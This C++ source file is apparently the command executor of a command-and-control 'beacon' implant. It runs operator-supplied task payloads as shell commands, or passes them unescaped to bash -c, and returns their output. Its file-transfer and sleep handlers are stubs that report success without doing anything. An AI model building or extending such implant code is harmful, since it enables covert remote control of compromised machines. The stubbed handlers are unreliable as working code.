#include "adaptix/beacon/command_executor.h"

#include <array>
#include <cstdio>
#include <memory>
#include <sstream>

namespace adaptix {
namespace beacon {

TaskResult CommandExecutor::ExecuteCommandTask(const Task& task) {
  std::array<char, 128> buffer;
  std::string output;

#ifdef _WIN32
  std::unique_ptr<FILE, decltype(&_pclose)> pipe(
      _popen(task.payload().c_str(), "r"), _pclose);
#else
  std::unique_ptr<FILE, decltype(&pclose)> pipe(
      popen(task.payload().c_str(), "r"), pclose);
#endif

  if (!pipe) {
    TaskResult result(task.id(), TaskStatus::kFailed, "");
    result.set_error_message("Failed to execute command");
    return result;
  }

  while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
    output += buffer.data();
  }

  return TaskResult(task.id(), TaskStatus::kCompleted, output);
}

TaskResult CommandExecutor::ExecuteScriptTask(const Task& task,
                                               std::string_view interpreter) {
  std::ostringstream command_stream;
  command_stream << interpreter << " -c \"" << task.payload() << "\"";
  
  std::array<char, 128> buffer;
  std::string output;

#ifdef _WIN32
  std::unique_ptr<FILE, decltype(&_pclose)> pipe(
      _popen(command_stream.str().c_str(), "r"), _pclose);
#else
  std::unique_ptr<FILE, decltype(&pclose)> pipe(
      popen(command_stream.str().c_str(), "r"), pclose);
#endif

  if (!pipe) {
    TaskResult result(task.id(), TaskStatus::kFailed, "");
    result.set_error_message("Failed to execute script");
    return result;
  }

  while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
    output += buffer.data();
  }

  return TaskResult(task.id(), TaskStatus::kCompleted, output);
}

TaskResult DefaultCommandExecutor::Execute(const Task& task) {
  switch (task.type()) {
    case TaskType::kCommand:
      return ExecuteCommandTask(task);
    case TaskType::kScript:
      return ExecuteScriptTask(task, "bash");
    case TaskType::kFileDownload:
      return HandleFileDownload(task);
    case TaskType::kFileUpload:
      return HandleFileUpload(task);
    case TaskType::kSleep:
      return HandleSleep(task);
    default: {
      TaskResult result(task.id(), TaskStatus::kFailed, "");
      result.set_error_message("Unknown task type");
      return result;
    }
  }
}

TaskResult DefaultCommandExecutor::HandleFileDownload(const Task& task) {
  TaskResult result(task.id(), TaskStatus::kCompleted, "");
  return result;
}

TaskResult DefaultCommandExecutor::HandleFileUpload(const Task& task) {
  TaskResult result(task.id(), TaskStatus::kCompleted, "");
  return result;
}

TaskResult DefaultCommandExecutor::HandleSleep(const Task& task) {
  TaskResult result(task.id(), TaskStatus::kCompleted, "Sleep command acknowledged");
  return result;
}

}  // namespace beacon
}  // namespace adaptix
